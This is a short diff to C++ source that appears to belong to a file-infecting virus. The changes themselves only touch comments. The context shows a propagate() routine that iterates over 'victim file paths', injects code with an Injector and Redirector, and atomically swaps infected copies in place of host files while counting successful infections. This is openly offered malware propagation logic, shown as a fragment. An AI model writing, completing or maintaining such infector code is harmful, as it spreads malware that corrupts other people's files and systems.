@@ -16,7 +16,7 @@ namespace vt::propagation {
 // @Tparam DirIteratorT A directory iterator that provides victim file paths.
 // @Tparam Injector     A code injector.
 // @Tparam Redirector   A redirector.
-// @returns number of success infection.
+// @returns number of successful infection.
 template <typename DirIteratorT, typename Injector, typename Redirector>
 size_t propagate() {
   size_t num_infections = 0;
@@ -60,6 +60,7 @@ size_t propagate() {
 
       if (!vt::infector::atomic_swap_host(host.handle(), host_path,
                                           new_host.handle(), tmp)) {
+        // may fail due to lack of permission.
         (void)vt::unlink(tmp);
       } else {
         num_infections++;
